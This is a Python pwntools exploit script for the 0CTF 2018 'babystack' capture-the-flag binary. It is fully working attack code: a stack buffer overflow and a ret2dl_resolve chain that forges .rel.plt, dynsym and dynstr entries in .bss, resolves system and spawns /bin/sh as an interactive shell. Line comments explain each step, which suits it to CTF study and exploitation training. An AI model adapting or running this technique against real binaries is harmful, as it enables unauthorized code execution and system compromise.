# This exploit is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/0CTFQuals/2018/babystack

from pwn import *

p = process('./babystack')
#gdb.attach(target)

elf = ELF('babystack')

# Establish starts of various sections  # readelf -S babystack 
bss = 0x0804a020
dynstr = 0x0804822c
dynsym = 0x080481cc
relplt = 0x080482b0

# Establish two functions

scanInput = p32(0x0804843b)
resolve = p32(0x080482f0)

# Establish size of second payload

payload1_size = 43

# Our first scan
# This will call read to scan in our fake entries into the plt
# Then return back to scanInput to re-exploit the bug

payload0 = b"A"*44                      # Filler from start of input to return address
payload0 += p32(elf.symbols['read'])    # Return read
payload0 += scanInput                   # After the read call, return to scan input
payload0 += p32(0)                      # Read via stdin
payload0 += p32(bss)                    # Scan into the start of the bss
payload0 += p32(payload1_size)          # How much data to scan in

p.send(payload0)

# Our second scan
# This will be scanned into the start of the bss
# It will contain the fake entries for our ret_2_dl_resolve attack

# Calculate the r_info value
# It will provide an index to our dynsym entry
dynsym_offset = ((bss + 0xc) - dynsym) // 0x10
r_info = (dynsym_offset << 8) + 7
print('r_info :', r_info)
# Calculate the offset from the start of dynstr section to our dynstr entry
dynstr_index = (bss + 28) - dynstr #OK
print('dynstr_index :', dynstr_index)
# Our .rel.plt entry

payload1 = p32(elf.got['alarm']) # 0-3
payload1 += p32(r_info) # 4-7
# Empty
payload1 += b"a"*4 # 8-11
# Our dynsm entry
payload1 += p32(dynstr_index) # 12-16

payload1 += p32(0x0)*3 # 17-28

# Our dynstr entry
payload1 += b"system\x00" # 29 - 35
# Store "/bin/sh" here so we can have a pointer ot it
payload1 += b"/bin/sh\x00" # 36 - 43
print(payload1)
p.send(payload1)


# Our third scan, which will execute the ret_2_dl_resolve
# This will just call 0x80482f0, which is responsible for calling the functions for resolving
# We will pass it the `.rel.plt` index for our fake entry
# As well as the arguments for system

# Calculate address of "/bin/sh"
binsh_bss_address = bss + 35

# Calculate the .rel.plt offset
ret_plt_offset = bss - relplt

payload2 = b"A"*44
payload2 += resolve                   # 0x80482f0
payload2 += p32(ret_plt_offset)       # .rel.plt offset
payload2 += p32(0x0)                  # The next return address after 0x80482f0, really doesn't matter for us
payload2 += p32(binsh_bss_address)    # Our argument, address of "/bin/sh"

p.send(payload2)

# Enjoy the shell!
p.interactive()
